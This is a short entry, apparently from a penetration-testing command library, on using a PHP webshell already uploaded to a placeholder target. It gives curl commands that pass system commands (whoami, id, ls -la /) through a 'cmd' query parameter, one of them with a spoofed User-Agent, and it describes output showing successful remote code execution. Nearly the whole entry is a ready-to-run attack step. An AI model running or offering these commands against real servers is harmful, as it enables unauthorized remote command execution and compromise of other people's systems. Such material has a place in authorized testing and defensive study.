---
data: 'curl "https://target.com/images/uploads/shell.php?cmd=whoami"'
tags:
  - rce
  - execution
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 60776350-7891-4f2b-8fc8-5fbba08b5003
created_at: '2025-12-14T05:32:13.223Z'
updated_at: '2025-12-14T05:32:13.223Z'
verified: false
validated: true
submitted: true
---
# curl-access-php-file

## Command

```bash
curl "https://target.com/images/uploads/shell.php?cmd=whoami"
```

## Description

This curl command accesses an uploaded PHP webshell on the target server, passing a system command via GET parameter to execute arbitrary code remotely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://target.com/images/uploads/shell.php` | URL of the uploaded PHP file | Yes |
| `?cmd=whoami` | Query parameter for command injection | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com/images/uploads/shell.php?cmd=id"
```

### Advanced Usage

```bash
curl "https://target.com/images/uploads/shell.php?cmd=ls -la /" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Response body containing the output of the command, e.g., "www-data" for whoami, indicating successful RCE.

## Related

- [[Related Procedure]]
